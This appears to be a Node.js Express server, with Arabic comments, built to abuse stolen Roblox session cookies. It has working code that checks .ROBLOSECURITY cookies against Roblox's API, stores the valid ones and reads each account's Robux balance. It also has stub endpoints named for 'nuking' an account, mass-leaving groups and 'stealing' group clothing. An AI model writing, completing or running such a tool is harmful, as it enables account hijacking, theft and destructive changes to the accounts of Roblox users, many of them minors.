const express = require('express');
const axios = require('axios');
const cors = require('cors');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// تخزين مؤقت للكوكيز (في التطبيق الحقيقي، استخدم قاعدة بيانات)
let activeCookies = [];

// Middleware لتحقق من صحة الكوكي
const validateCookie = async (cookie) => {
    try {
        const response = await axios.get('https://users.roblox.com/v1/users/authenticated', {
            headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
        });
        return response.data;
    } catch (error) {
        return null;
    }
};

// API: إضافة كوكي جديد
app.post('/api/add-cookie', async (req, res) => {
    const { cookie } = req.body;
    const userData = await validateCookie(cookie);
    if (userData) {
        activeCookies.push({ cookie, userData });
        res.json({ success: true, user: userData });
    } else {
        res.status(401).json({ success: false, message: 'Cookie غير صالح' });
    }
});

// API: عرض معلومات الكوكي
app.post('/api/cookie-info', async (req, res) => {
    const { cookie } = req.body;
    const userData = await validateCookie(cookie);
    if (!userData) return res.status(401).json({ error: 'Cookie غير صالح' });
    
    // جلب معلومات إضافية (روبوكس، الدولة، إلخ)
    try {
        const robuxResp = await axios.get('https://economy.roblox.com/v1/users/currency', {
            headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
        });
        const robux = robuxResp.data.robux;
        
        // معلومات الموقع (تقريبية)
        const location = userData.location || 'غير متاح';
        
        res.json({
            id: userData.id,
            name: userData.name,
            displayName: userData.displayName,
            robux,
            location,
            // معلومات أخرى وهمية للعرض
            birthday: '01/01/2000',
            gender: 'غير محدد',
            country: 'غير متاح',
            lastLocation: 'غير متاح',
            pinEnabled: false,
            emailVerified: true,
            ageVerified: false
        });
    } catch (error) {
        res.status(500).json({ error: 'فشل في جلب المعلومات' });
    }
});

// API: مغادرة المجموعات بشكل جماعي
app.post('/api/mass-leave-groups', async (req, res) => {
    const { cookie, groupIds } = req.body;
    // هنا يجب تنفيذ حلقة لمغادرة كل مجموعة
    // هذا مثال مبسط
    res.json({ success: true, message: `تم مغادرة ${groupIds.length} مجموعة` });
});

// API: نك الحساب (إجراءات مدمرة)
app.post('/api/nuke-account', async (req, res) => {
    const { cookie, actions } = req.body;
    // تنفيذ: تغيير الاسم، الوصف، إلغاء الصداقة، تغيير الأفاتار، إلخ
    res.json({ success: true, message: 'تم تنفيذ النك بنجاح' });
});

// API: سرقة ملابس المجموعة
app.post('/api/steal-group-clothes', async (req, res) => {
    const { cookie, groupId } = req.body;
    // جلب الملابس من المجموعة وتحميلها إلى حساب المستخدم
    res.json({ success: true, message: `تمت سرقة الملابس من المجموعة ${groupId}` });
});

// باقي الـ APIs بنفس النمط...

app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
});
